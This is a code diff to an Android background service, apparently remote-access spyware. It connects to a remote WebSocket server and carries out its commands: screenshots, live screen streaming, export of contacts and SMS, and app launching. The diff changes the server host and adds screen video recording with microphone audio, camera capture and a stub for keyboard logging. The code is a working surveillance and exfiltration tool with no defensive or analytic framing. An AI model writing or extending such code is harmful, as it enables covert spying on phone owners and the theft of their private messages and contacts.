@@ -5,7 +5,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
@@ -16,12 +15,14 @@ import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
 import android.media.Image;
 import android.media.ImageReader;
+import android.media.MediaRecorder;
 import android.media.projection.MediaProjection;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.Telephony;
 import android.util.Base64;
 
@@ -53,6 +54,8 @@ public class WebSocketService extends Service {
     private Runnable streamRunnable;
     private ImageReader imageReader;
     private VirtualDisplay virtualDisplay;
+    private MediaRecorder mediaRecorder;
+    private String videoFilePath;
 
     public static void setMediaProjection(MediaProjection mp) {
         sMediaProjection = mp;
@@ -77,8 +80,9 @@ public class WebSocketService extends Service {
     public void onCreate() {
         super.onCreate();
         prefs = getSharedPreferences("kriptoman", MODE_PRIVATE);
-        serverUrl = prefs.getString("server_url", "wss://kriptoman.onrender.com");
+        serverUrl = prefs.getString("server_url", "wss://pycj.onrender.com");
         writeLog("=== СЕРВИС ЗАПУЩЕН ===");
+        writeLog("URL сервера: " + serverUrl);
         createNotificationChannel();
         startForeground(1, getNotification());
         connectWebSocket();
@@ -151,16 +155,43 @@ public class WebSocketService extends Service {
                 writeLog("Команда: " + action);
                 executeCommand(action, json.optJSONObject("params"));
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            writeLog("Ошибка обработки команды: " + e.toString());
+        }
     }
 
     private void executeCommand(String action, org.json.JSONObject params) {
+        writeLog("Выполнение команды: " + action);
         switch (action) {
-            case "screenshot": takeScreenshot(); break;
-            case "stream": handleStream(params); break;
-            case "contacts": exportContacts(); break;
-            case "sms": exportSms(); break;
-            default: writeLog("Неизвестная команда: " + action);
+            case "screenshot":
+                takeScreenshot();
+                break;
+            case "stream":
+                handleStream(params);
+                break;
+            case "video":
+                startVideoRecording();
+                break;
+            case "keyboard":
+                writeLog("Запись клавиатуры (заглушка)");
+                break;
+            case "app":
+                openApp(params != null ? params.optString("package") : null);
+                break;
+            case "frontcam":
+                startCamera(true);
+                break;
+            case "backcam":
+                startCamera(false);
+                break;
+            case "contacts":
+                exportContacts();
+                break;
+            case "sms":
+                exportSms();
+                break;
+            default:
+                writeLog("Неизвестная команда: " + action);
         }
     }
 
@@ -197,7 +228,10 @@ public class WebSocketService extends Service {
     }
 
     private void takeScreenshotForStream() {
-        if (sMediaProjection == null) return;
+        if (sMediaProjection == null) {
+            writeLog("MediaProjection не инициализирован для стрима");
+            return;
+        }
         try {
             imageReader = ImageReader.newInstance(480, 640, PixelFormat.RGBA_8888, 2);
             virtualDisplay = sMediaProjection.createVirtualDisplay("Stream", 480, 640, 240,
@@ -209,19 +243,27 @@ public class WebSocketService extends Service {
                 byte[] bytes = new byte[buffer.remaining()];
                 buffer.get(bytes);
                 Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
+                if (bitmap != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
+                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                    client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
+                    writeLog("Кадр стрима отправлен");
+                }
                 image.close();
             }
             if (virtualDisplay != null) virtualDisplay.release();
             if (imageReader != null) imageReader.close();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            writeLog("Ошибка стрима: " + e.toString());
+        }
     }
 
     private void takeScreenshot() {
-        if (sMediaProjection == null) return;
+        if (sMediaProjection == null) {
+            writeLog("MediaProjection не инициализирован для скриншота");
+            return;
+        }
         try {
             imageReader = ImageReader.newInstance(720, 1280, PixelFormat.RGBA_8888, 2);
             virtualDisplay = sMediaProjection.createVirtualDisplay("Screenshot", 720, 1280, 240,
@@ -233,16 +275,100 @@ public class WebSocketService extends Service {
                 byte[] bytes = new byte[buffer.remaining()];
                 buffer.get(bytes);
                 Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
-                writeLog("Скриншот отправлен");
+                if (bitmap != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                    String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                    client.send("{\"type\":\"screenshot\",\"image\":\"data:image/jpeg;base64," + base64 + "\"}");
+                    writeLog("Скриншот отправлен");
+                }
                 image.close();
             }
             if (virtualDisplay != null) virtualDisplay.release();
             if (imageReader != null) imageReader.close();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            writeLog("Ошибка скриншота: " + e.toString());
+        }
+    }
+
+    private void startVideoRecording() {
+        if (sMediaProjection == null) {
+            writeLog("MediaProjection не инициализирован для видео");
+            return;
+        }
+        try {
+            File dir = new File(getExternalFilesDir(null), "videos");
+            if (!dir.exists()) dir.mkdirs();
+            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
+            videoFilePath = new File(dir, "video_" + timestamp + ".mp4").getAbsolutePath();
+
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.setVideoSize(720, 1280);
+            mediaRecorder.setVideoFrameRate(30);
+            mediaRecorder.setOutputFile(videoFilePath);
+            mediaRecorder.prepare();
+
+            VirtualDisplay vd = sMediaProjection.createVirtualDisplay("VideoRecording",
+                    720, 1280, 240,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    mediaRecorder.getSurface(), null, null);
+            // сохраняем в поле, чтобы потом закрыть
+            mediaRecorder.start();
+            writeLog("Видеозапись начата, файл: " + videoFilePath);
+
+            // Остановить через 30 секунд (можно продлить)
+            handler.postDelayed(() -> {
+                try {
+                    mediaRecorder.stop();
+                    mediaRecorder.release();
+                    mediaRecorder = null;
+                    writeLog("Видео остановлено, файл: " + videoFilePath);
+                    // Можно отправить на сервер, но пока сохраняем локально
+                } catch (Exception e) {
+                    writeLog("Ошибка остановки видео: " + e.toString());
+                }
+            }, 30000);
+        } catch (Exception e) {
+            writeLog("Ошибка видео: " + e.toString());
+        }
+    }
+
+    private void openApp(String pkg) {
+        if (pkg == null || pkg.isEmpty()) {
+            writeLog("Не указан пакет");
+            return;
+        }
+        try {
+            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                writeLog("Приложение открыто: " + pkg);
+            } else {
+                writeLog("Приложение не найдено: " + pkg);
+            }
+        } catch (Exception e) {
+            writeLog("Ошибка открытия приложения: " + e.toString());
+        }
+    }
+
+    private void startCamera(boolean front) {
+        try {
+            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
+            if (front) {
+                intent.putExtra("android.intent.extras.CAMERA_FACING", 1);
+            }
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            writeLog("Камера запущена, фронтальная: " + front);
+        } catch (Exception e) {
+            writeLog("Ошибка камеры: " + e.toString());
+        }
     }
 
     private void exportContacts() {
@@ -306,6 +432,9 @@ public class WebSocketService extends Service {
     public void onDestroy() {
         if (client != null) client.close();
         streaming = false;
+        if (mediaRecorder != null) {
+            try { mediaRecorder.release(); } catch (Exception e) {}
+        }
         super.onDestroy();
     }
 }
